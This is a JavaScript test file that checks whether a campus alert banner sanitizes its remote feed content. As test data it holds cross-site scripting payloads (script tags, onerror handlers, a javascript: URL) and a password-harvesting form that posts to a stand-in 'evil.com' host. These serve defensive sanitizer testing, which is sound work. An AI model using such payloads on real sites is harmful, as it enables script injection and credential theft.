// @vitest-environment jsdom

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

// Importing the entry runs its top-level side effects: it reads document.body,
// appends the remote feed <script> (inert in jsdom — no network), and registers
// `window.displayAlert`. Exercising the real `displayAlert` here (not just the
// pure helpers) is what proves the banner actually renders sanitized DOM — a
// helper-only suite stays green even if a sink's sanitize wiring is reverted,
// or if the module-strict-mode entry crashes before building any banner.
import './uamsalert.js';

/**
 * Build a feed payload whose category slug matches the default `uams` site
 * status computed at import time, so `displayAlert` reaches `addElement`.
 */
function feed(overrides = {}) {
    return {
        found: 1,
        posts: [
            Object.assign(
                {
                    title: 'Campus Closure',
                    URL: 'https://news.uams.edu/weather/',
                    content: '<p>Roads are icy.</p>',
                    categories: { Alerts: { slug: 'alert-uams' } },
                },
                overrides,
            ),
        ],
    };
}

function banner() {
    return document.getElementById('uamsalert-alert-message');
}

describe('uamsalert displayAlert (integration)', () => {
    beforeEach(() => {
        // `addElement` schedules a setTimeout that reads the banner's offsetHeight;
        // fake timers keep it from firing on a removed element in a later tick.
        vi.useFakeTimers();
        const existing = banner();
        if (existing) {
            existing.remove();
        }
    });

    afterEach(() => {
        vi.clearAllTimers();
        vi.useRealTimers();
    });

    it('registers the JSONP callback on window', () => {
        expect(typeof window.displayAlert).toBe('function');
    });

    it('renders the banner without throwing (no strict-mode implicit-global crash)', () => {
        expect(() => window.displayAlert(feed())).not.toThrow();
        expect(banner()).not.toBeNull();
    });

    it('neutralizes script and event-handler payloads in feed content', () => {
        window.displayAlert(feed({ content: '<p>open</p><script>alert(1)</script><img src=x onerror=alert(2)>' }));

        const text = banner().querySelector('.text-container');
        expect(text.querySelector('script')).toBeNull();
        expect(text.innerHTML).not.toMatch(/onerror/i);
        expect(text.textContent).toContain('open');
    });

    it('renders the feed title as inert text, not markup', () => {
        window.displayAlert(feed({ title: '<img src=x onerror=alert(1)>' }));

        const heading = banner().querySelector('h1');
        expect(heading.querySelector('img')).toBeNull();
        expect(heading.textContent).toBe('<img src=x onerror=alert(1)>');
    });

    it('rewrites a javascript: feed URL to the safe fallback on the Read More link', () => {
        window.displayAlert(feed({ URL: 'javascript:alert(1)', content: '<p>teaser</p><!--noteaser--><p>rest</p>' }));

        const link = banner().querySelector('a.btn');
        expect(link).not.toBeNull();
        expect(link.getAttribute('href')).toBe('#');
    });

    it('strips a credential-harvesting form and overlay style from feed content', () => {
        window.displayAlert(feed({
            content: '<form action="//evil.com"><input type="password"></form><div style="position:fixed;inset:0">x</div>',
        }));

        const text = banner().querySelector('.text-container');
        expect(text.querySelector('form')).toBeNull();
        expect(text.querySelector('input')).toBeNull();
        expect(text.querySelector('[style]')).toBeNull();
    });
});
